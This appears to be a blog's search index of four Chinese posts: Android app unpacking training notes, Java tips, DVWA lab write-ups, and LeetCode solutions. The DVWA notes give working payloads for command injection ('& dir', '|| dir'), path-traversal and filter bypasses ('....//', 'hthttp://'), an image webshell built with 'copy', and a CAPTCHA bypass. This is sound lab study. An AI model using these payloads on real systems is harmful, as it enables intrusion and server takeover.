<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020 SDC 安卓app加固攻与防训练营记录</title>
    <url>/2020/10/19/2020-SDC-%E5%AE%89%E5%8D%93app%E5%8A%A0%E5%9B%BA%E6%94%BB%E4%B8%8E%E9%98%B2%E8%AE%AD%E7%BB%83%E8%90%A5%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="前期环境准备"><a href="#前期环境准备" class="headerlink" title="前期环境准备"></a>前期环境准备</h1><h2 id="通知"><a href="#通知" class="headerlink" title="通知"></a>通知</h2><p>@所有人<br>感谢大家报名《2020 SDC 安卓app加固攻与防》训练营,下面给大家说下训练营需要做好预先准备的内容:<br>1、提前准备好500G的存储空间。课程会给大家准备好aosp完整编译和实验环境，因此需要提前准备好足够的空间。<br>2、课程全程在pixel手机上进行实验，该机型随报名课程赠送每人一个。<br>3、需要提前掌握aosp系统编译与刷机、常见逆向分析常见工具如jadx,jeb，ida，gdb等的使用<br>4、鉴于直接拉aosp代码非常耗时，我这里上传了压缩的aosp8.0源码，下载解压直接搭建源码编译环境即可，复制这段内容后打开百度网盘手机App，操作更方便哦 链接:<a href="https://pan.baidu.com/s/1XrJ_TziryjuDBwa5JCpbIg" target="_blank" rel="noopener">https://pan.baidu.com/s/1XrJ_TziryjuDBwa5JCpbIg</a> 提取码:7x41</p>
<hr>
<p>训练营地点确定了。在上海裕景大饭店<br>时间10/22  9：00-18：00</p>
<h2 id="aosp系统编译"><a href="#aosp系统编译" class="headerlink" title="aosp系统编译"></a>aosp系统编译</h2><h2 id="jadx，jeb，ida，gdb在android上的使用"><a href="#jadx，jeb，ida，gdb在android上的使用" class="headerlink" title="jadx，jeb，ida，gdb在android上的使用"></a>jadx，jeb，ida，gdb在android上的使用</h2><p>jadx：<a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">https://github.com/skylot/jadx</a></p>
<p>jeb：<a href="https://www.52pojie.cn/thread-722648-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-722648-1-1.html</a></p>
<p>jeb要java 8.121及之前版本</p>
<h1 id="训练营内容"><a href="#训练营内容" class="headerlink" title="训练营内容"></a>训练营内容</h1><h2 id="1-and-app加固技术发展"><a href="#1-and-app加固技术发展" class="headerlink" title="1. and app加固技术发展"></a>1. and app加固技术发展</h2><p>dex，整体粒度</p>
<p>函数粒度</p>
<p>vmp，dex2c，指令粒度</p>
<p>只加固onCreate函数，因为参数固定</p>
<p>用jni语言映射java，因为jni不好逆？</p>
<p>加壳后每个函数解释器是相同的，不然so会很大</p>
<hr>
<p>判断壳的类型：</p>
<ol>
<li>整体壳只要完整dump下来就行</li>
</ol>
<ol>
<li>函数壳在dump完内存dex镜像后，依然存在函数内容无效的情况，（直接nop或随机填充）</li>
</ol>
<ol>
<li>指令粒度壳：</li>
</ol>
<ul>
<li><p>如果每个函数绑定到相同地址（共享解释器），是vmp</p>
</li>
<li><p>如果每个被保护的函数逻辑不同，大小不同，是dec2c</p>
</li>
</ul>
<p>vmp映射关系，const string之类的指令可以很方便猜出来，因为长度固定，允许多对一映射，每个函数的映射关系都不一样</p>
<h2 id="2-and-app脱壳原理"><a href="#2-and-app脱壳原理" class="headerlink" title="2. and app脱壳原理"></a>2. and app脱壳原理</h2><p>dexcode的前16字节是固定的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct DexCode &#123;</span><br><span class="line">	u2</span><br><span class="line">	u2</span><br><span class="line">	u2</span><br><span class="line">	u2</span><br><span class="line">	u4</span><br><span class="line">	u4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如何整体dex获取？</p>
<ol>
<li>内存中dex文件的起始地址和大小</li>
<li>时机问题（不同的时机dump的内容不一样，越晚越完整？）</li>
</ol>
<p>Dalvik下通用脱壳</p>
<p>关键字pathList以及内部类lement，根据classloader来脱壳</p>
<p>loadDex-&gt;DexFile-&gt;openDexFile-&gt;。。</p>
<p>Dalvik下两个有效脱壳点：</p>
<ol>
<li>主要是带dex前缀的？</li>
<li>dexfileparse，dvmDexFileOpen</li>
</ol>
<p>getDex和getBytes函数，可以直接用纯java代码写脱壳工具</p>
<p>ART脱壳点</p>
<ol>
<li>openCommon，openMemory</li>
<li>修改dex2oat在dex编译优化流程中完成脱壳</li>
<li>利用构造函数DexFile::DexFile()脱壳</li>
</ol>
<p>拿到artmethod，也可脱壳，ida打开后搜artmethod方法，</p>
<p>solveClass，defineClass</p>
<h2 id="3-FART脱壳机的原理"><a href="#3-FART脱壳机的原理" class="headerlink" title="3. FART脱壳机的原理"></a>3. FART脱壳机的原理</h2><p>三大功能</p>
<ul>
<li><p>dex dump</p>
</li>
<li><p>主动调用</p>
</li>
<li><p>修复组件</p>
</li>
</ul>
<h2 id="4-hyperpwn动态调试vmp"><a href="#4-hyperpwn动态调试vmp" class="headerlink" title="4. hyperpwn动态调试vmp"></a>4. hyperpwn动态调试vmp</h2>]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Android RE</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习笔记</title>
    <url>/2020/09/23/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="vscode-java疑难杂症"><a href="#vscode-java疑难杂症" class="headerlink" title="vscode+java疑难杂症"></a>vscode+java疑难杂症</h1><h2 id="1-报找不到主类的错误"><a href="#1-报找不到主类的错误" class="headerlink" title="1. 报找不到主类的错误"></a>1. 报找不到主类的错误</h2><p>示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lixiao.sorthuluwa;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lixiao.grandfather.*;</span><br><span class="line"><span class="keyword">import</span> lixiao.huluwa.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortHuluwa</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Huluwa[] queue = &#123;<span class="keyword">new</span> Huluwa(<span class="number">1</span>, <span class="string">"大娃"</span>)&#125;;</span><br><span class="line">        Grandfather.getInstance().SortHuluwa(queue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac SortHuluwa.java 无错误</span><br><span class="line">java SortHuluwa 报找不到主类的错误</span><br></pre></td></tr></table></figure>
<p>原因，要带上包名运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java lixiao.sorthuluwa.SortHuluwa</span><br></pre></td></tr></table></figure>
<h2 id="2-多个package，多个java文件时不要点run-code按钮"><a href="#2-多个package，多个java文件时不要点run-code按钮" class="headerlink" title="2. 多个package，多个java文件时不要点run code按钮"></a>2. 多个package，多个java文件时不要点run code按钮</h2><p>因为其他包还没编译，首先要编译其他包，然后编译自己</p>
<p>编译时不要用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -d . *.java</span><br></pre></td></tr></table></figure>
<p>因为没有指定编译顺序，依赖会错误</p>
<p>可以写个bat脚本来做编译包和运行的事，比如</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> .\*.class /s</span><br><span class="line"><span class="built_in">echo</span> "删除*.class成功"</span><br><span class="line"></span><br><span class="line">javac -d . Huluwa.java</span><br><span class="line">javac -d . Grandfather.java</span><br><span class="line">javac -d . SortHuluwa.java</span><br><span class="line">java lixiao.sorthuluwa.SortHuluwa</span><br></pre></td></tr></table></figure>
<h2 id="3-设计问题：不希望父类被new-Huluwa-，但允许子类的new-Dawa"><a href="#3-设计问题：不希望父类被new-Huluwa-，但允许子类的new-Dawa" class="headerlink" title="3. 设计问题：不希望父类被new Huluwa()，但允许子类的new Dawa()"></a>3. 设计问题：不希望父类被new Huluwa()，但允许子类的new Dawa()</h2><p>即不希望看到父类的默认构造函数被外部使用者调用</p>
<p>但允许子类构造函数被外部使用者调用，做法是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Huluwa &#123;</span><br><span class="line">	protected Huluwa() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Dawa extends Huluwa &#123;</span><br><span class="line">	public Dawa() &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不可以使用默认访问权限（包内的class可见），因为虽然父类和子类偶尔处于一个包之下，不会出错，但万一不在一个包底下，直接编译错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//Huluwa() &#123;&#125; //不可以</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA学习笔记</title>
    <url>/2021/01/23/DVWA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>DVWA学习笔记</p>
<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>是个登录，输入账号密码，无验证码</p>
<p>burp抓包结果如下</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210113110441347.png" alt="image-20210113110441347"></p>
<p>其实改的只有url</p>
<p>用intruder模块爆破<code>username</code>和<code>password</code>字段，自己定义几个相关的用户名密码就行，爆破结果看长度</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210113110618549.png" alt="image-20210113110618549"></p>
<p>结果发现用户名是<code>admin</code>或者<code>Admin</code>，密码是<code>password</code></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210113110715019.png" alt="image-20210113110715019"></p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>同low</p>
<h2 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h2><p>同low</p>
<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p>对于输入错误的账号密码，有保护机制，15min？</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210113111323787.png" alt="image-20210113111323787"></p>
<p>但是对正确的账号密码，即使被锁15min照样可以登录</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210113111445708.png" alt="image-20210113111445708"></p>
<p>需要注意的是我第一次用正确的账号密码登录时，在上面图片的下面还有一行字，提示已经尝试多少次，上次成功登录时间是1.10 18.00（大概是装DVWA的那天？），不过没截图</p>
<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>ping + 输入</p>
<p>windows下可以输入 ping 127.0.0.1 &amp; dir，执行两条命令</p>
<h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p>ping 127.0.0.1 &amp; dir依然可以用，看下源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114100902448.png" alt="image-20210114100902448"></p>
<p>发现有输入过滤：将输入中的&amp;&amp;和;去掉了</p>
<p>推测low难度下&amp;&amp;也能成，发现确实可以</p>
<blockquote>
<p>百度下发现，windows下连续执行命令有多种</p>
<ol>
<li>x &amp; y：先执行x，不管x是否可执行，都执行y</li>
<li>x &amp;&amp; y：先执行x，若x不可执行就不执行y了</li>
<li>x || y：先执行x，如果x不可执行，才能执行y，否则y不执行</li>
</ol>
</blockquote>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>ping 127.0.0.1 &amp;&amp; dir失败</p>
<p>ping 127.0.0.1 &amp; dir失败</p>
<p>推测把&amp;&amp;和&amp;都过滤了，那么使用||，让命令1失败，命令2执行</p>
<p>ping . || dir，成功</p>
<p>看下源码发现||也过滤了，那我是怎么执行的。。？</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114102651207.png" alt="image-20210114102651207"></p>
<p>改了下源码输出target</p>
<p>输入为<code>. || dir</code>时，target的值为  <code>. |dir</code></p>
<p>我知道了，过滤|的时候，仔细看源码，其实是”| “，竖线后面有个空格，所以我输入. || d时，被干掉的是第二个竖线和它后面的空格（为什么不会先匹配||呢？可能是str_replace函数在处理多个替换串的时候，是先按第一个串扫一遍字符串，结束了再按第二个串扫一遍字符串，再结束了再扫第三个以此类推，由于”| “在前，所以它优先替换了</p>
<p>命令 ping . |dir会直接跳过第一个命令（现象上是这样，实际是这样嘛？），执行第二个命令，即dir</p>
<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><p>查看源码，首先按.分割输入，然后要求分割成4块，且每一块都是数字，没办法了</p>
<p>同时加入了防CSRF攻击，是后话了</p>
<h1 id="Cross-Site-Request-Forgecy-CSRF"><a href="#Cross-Site-Request-Forgecy-CSRF" class="headerlink" title="Cross Site Request Forgecy (CSRF)"></a>Cross Site Request Forgecy (CSRF)</h1><p>跳过</p>
<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>文件结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DVWA</span><br><span class="line"></span><br><span class="line">--hackable</span><br><span class="line"></span><br><span class="line">----flag</span><br><span class="line"></span><br><span class="line">------fi.php</span><br><span class="line"></span><br><span class="line">--vulnerabilities</span><br><span class="line"></span><br><span class="line">----fi</span><br><span class="line"></span><br><span class="line">------index.php</span><br></pre></td></tr></table></figure>
<p>展现给我们的是index.php</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114225827403.png" alt="image-20210114225827403"></p>
<p>这里url里没有写明白是index.php（搜索一下，index.php?可以简写为?），没关系，把page参数改改，让他报个错</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114225904964.png" alt="image-20210114225904964"></p>
<p>点view help，要求我们利用文件包含漏洞查看../hackable/flags/fi.php里的5句名言，实际上少打了俩..</p>
<p>利用的url为：</p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114230628496.png" alt="image-20210114230628496"></p>
<p>但这样只有3句？</p>
<p>page=file4.php提示我在干正确的事，没明白</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232209820.png" alt="image-20210114232209820"></p>
<p>此外，绝对路径和远程文件都可以成功</p>
<hr>
<p>index.php源码是简简单单一个file，获取page参数</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114230706690.png" alt="image-20210114230706690"></p>
<h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><p>首先试试相对路径，发现不行，注意下面两张图里，../../xxx和../xxx都似乎被删掉了前面的../</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232727458.png" alt="image-20210114232727458"></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232710569.png" alt="image-20210114232710569"></p>
<p>然后试试报错出来的绝对路径，发现ok</p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=C:\software\phpstudy_pro\Extensions\php\php7.3.4nts\news.txt" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=C:\software\phpstudy_pro\Extensions\php\php7.3.4nts\news.txt</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232640590.png" alt="image-20210114232640590"></p>
<p>此外试试远程文件，不行</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232838689.png" alt="image-20210114232838689"></p>
<p>看下源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114232826767.png" alt="image-20210114232826767"></p>
<p>发现他过滤掉了http和https，以及相对路径，只能用绝对路径和ip地址咯？不，ip地址不行，因为也得http或者https去访问</p>
<p>利用url：<a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=C:\software\phpstudy_pro\WWW\DVWA\hackable\flags\fi.php" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=C:\software\phpstudy_pro\WWW\DVWA\hackable\flags\fi.php</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114233031356.png" alt="image-20210114233031356"></p>
<p>看了博客发现str_replace函数有漏洞，双写漏洞，比如</p>
<p><a href="http://=&gt;hthttp://tp://，中间的http://被删了，但外壳保留下来了，依然能使用" target="_blank" rel="noopener">http://=&gt;hthttp://tp://，中间的http://被删了，但外壳保留下来了，依然能使用</a></p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114234219803.png" alt="image-20210114234219803"></p>
<p>同理，本地的有</p>
<p>目标是../../hackable/flags/fi.php，../被过滤</p>
<p>../ =&gt; ….//</p>
<p>所以写成….//….//hackable/flags/fi.php</p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=....//....//hackable/flags/fi.php</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114234200645.png" alt="image-20210114234200645"></p>
<p>除此之外，看博客还有发现可以用大写HTTP绕过</p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=HTTP://www.baidu.com" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=HTTP://www.baidu.com</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210115000458704.png" alt="image-20210115000458704"></p>
<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>看源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210114235205036.png" alt="image-20210114235205036"></p>
<p>满足2个条件之一可以不报错</p>
<ol>
<li>文件名file开头</li>
<li>文件名是include.php</li>
</ol>
<p>绕过的话，考虑第一个，file开头，file://C:\software\phpstudy_pro\WWW\DVWA\hackable\flags\fi.php</p>
<p>利用url：</p>
<p><a href="http://192.168.168.216/DVWA/vulnerabilities/fi/?page=file://C:\software\phpstudy_pro\WWW\DVWA\hackable\flags\fi.php" target="_blank" rel="noopener">http://192.168.168.216/DVWA/vulnerabilities/fi/?page=file://C:\software\phpstudy_pro\WWW\DVWA\hackable\flags\fi.php</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210115000051378.png" alt="image-20210115000051378"></p>
<p>看博客发现还有用page=file1.php../../hackable/flags/fi.php的，没看懂这什么写法</p>
<h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><p>看源码，枚举了一遍白名单，无解</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210115000153310.png" alt="image-20210115000153310"></p>
<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><h2 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h2><p>尝试传php，提示只能传JPEG或PNG文件</p>
<p>看源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118160745234.png" alt="image-20210118160745234"></p>
<p>只过滤type，我们用burp的compare模块看一下上传php文件和上传png文件的包的区别</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118160924025.png" alt="image-20210118160924025"></p>
<p>发现Content-Type，一个是application/octet-stream，一个是image/png</p>
<p>拦截，改包，然后forward，成功</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118161225108.png" alt="image-20210118161225108"></p>
<p>反馈</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118161250890.png" alt="image-20210118161250890"></p>
<h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p>看源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118165259114.png" alt="image-20210118165259114"></p>
<p>strrpos(string, find)返回find在string中最后出现的位置</p>
<p>所以uploaded_ext是存的扩展名，白名单为jpg，jpeg，png</p>
<p>且getimagesize不能为0</p>
<p>所以可以用图片马绕过</p>
<p>图片马的制作：copy 1.png/b+2.php/a 3.png</p>
<p>连接需要用文件包含漏洞</p>
<p>修改下马的内容，加个phpinfo();，更直观显示</p>
<p>访问<a href="http://192.168.189.128/DVWA/vulnerabilities/fi/?page=file://C:\software\phpstudy_pro\WWW\DVWA\hackable\uploads\phppng.png进行测试，发现图片马里藏的php确实解析了" target="_blank" rel="noopener">http://192.168.189.128/DVWA/vulnerabilities/fi/?page=file://C:\software\phpstudy_pro\WWW\DVWA\hackable\uploads\phppng.png进行测试，发现图片马里藏的php确实解析了</a></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118174542320.png" alt="image-20210118174542320"></p>
<p><strong>然后就可以用蚁剑了，需要注意的是，用蚁剑连接文件包含漏洞是需要登录信息的，具体就是添加一个http header，内容填从burp里复制的cookie</strong></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118174357103.png" alt="image-20210118174357103"></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118174255249.png" alt="image-20210118174255249"></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118174624250.png" alt="image-20210118174624250"></p>
<h2 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h2><p>看源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118184453071.png" alt="image-20210118184453071"></p>
<p>注意其中的图片转换函数，会删掉图片马最后的php代码</p>
<p>观察文件大小</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118184545441.png" alt="image-20210118184545441"></p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210118184555225.png" alt="image-20210118184555225"></p>
<p>网上一张图，下面试试upload-labs</p>
<p><img src="/2021/01/23/DVWA学习笔记/20210103205416978.png" alt="img"></p>
<p>点绕过，空格，::$DATA</p>
<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><p>卡卡的，验证码模块似乎用不了</p>
<p>密码pass，新密码pass，看发出去的包，注意到step=1，那么试试step改成2，修改成功</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124181101293.png" alt="image-20210124181101293"></p>
<p>看源码发现，逻辑为，step=1的包发送一次，然后返回验证码模块，过了的话再step=2发送一次，后台执行修改密码</p>
<h2 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h2><p>admin/admin，看下包</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124182611229.png" alt="image-20210124182611229"></p>
<p>发现和low级别差不多，改成step=2却提示不行，看源码</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124182713927.png" alt="image-20210124182713927"></p>
<p>step=2的情况下还需要POST一个passed_captcha</p>
<p>改下包，随便设个值，过了</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124182548845.png" alt="image-20210124182548845"></p>
<h2 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h2><p>看源码发现有一个</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124191746361.png" alt="image-20210124191746361"></p>
<p>加了个POST的内容，但这个$SERVER不知道怎么定，包发出去之后</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124191534691.png" alt="image-20210124191534691"></p>
<p>我发现回包里，有个注释在提示我。。把User-Agent改成reCAPTCHA即可</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124191641043.png" alt="image-20210124191641043"></p>
<p>完事了</p>
<p>我觉得这个源码纯粹坑人，g-recaptcha-response这个名字我上哪猜去？</p>
<p><img src="/2021/01/23/DVWA学习笔记/image-20210124192047928.png" alt="image-20210124192047928"></p>
<p>唯一的线索是这里，但我哪知道怎么拼上去的，大小写呢？</p>
]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题笔记</title>
    <url>/2020/01/27/LeetCode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="简单题"><a href="#简单题" class="headerlink" title="简单题"></a>简单题</h1><h2 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="7. 整数反转"></a>7. 整数反转</h2><ol>
<li><p>每次截取末位，*10，叠加，直到原数x = 0</p>
</li>
<li><p>处理溢出，整数范围在-2147483648~2147483647，每次要溢出之前都是大于2147483647/10，或者小于-2147483648/10，所以只要判定一下即可</p>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//每次截取末位，*10，叠加</span></span><br><span class="line">        <span class="keyword">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (last &gt; <span class="number">2147483647</span> / <span class="number">10</span> ||</span><br><span class="line">                last &lt; <span class="number">-2147483648</span> / <span class="number">10</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            last = last * <span class="number">10</span>;</span><br><span class="line">            last += x % <span class="number">10</span>;</span><br><span class="line">            x = x / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="9-回文数"><a href="#9-回文数" class="headerlink" title="9. 回文数"></a>9. 回文数</h2><ol>
<li>首先，负数不是回文数</li>
<li>对非负数，先得到逆序数，再判断是否和原数相等</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> last = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> oldx = x;</span><br><span class="line">        <span class="keyword">while</span> (x != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (last &gt; <span class="number">2147483647</span> / <span class="number">10</span> ||</span><br><span class="line">                last &lt; <span class="number">-2147483648</span> / <span class="number">10</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    last = <span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            last = last * <span class="number">10</span>;</span><br><span class="line">            last += x % <span class="number">10</span>;</span><br><span class="line">            x = x / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> last == oldx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<p>官方题解说只要翻转一半的数字就可以了，同时可以避免溢出，如何判断到一半了呢？条件是x &lt; lastx</p>
<p>12345 - 54321，12345|0，1234|5，123|54，12|543。翻转到123 和543是否相等？12和54</p>
<p>123456-654321，123456|0,12345|6,12345|65,123|654。翻转到123和654是否相等，</p>
<p>修改了代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//负数，末位为0但本身不是0的数</span></span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || (x % <span class="number">10</span> == <span class="number">0</span> &amp;&amp; x != <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (x &gt; lastx)</span><br><span class="line">        &#123;</span><br><span class="line">            lastx = lastx * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">            x = x / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对于偶数长度的x，lastx == x</span></span><br><span class="line">        <span class="comment">//对于奇数长度的x，lastx / 10 == x</span></span><br><span class="line">        <span class="keyword">return</span> lastx == x || lastx / <span class="number">10</span> == x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
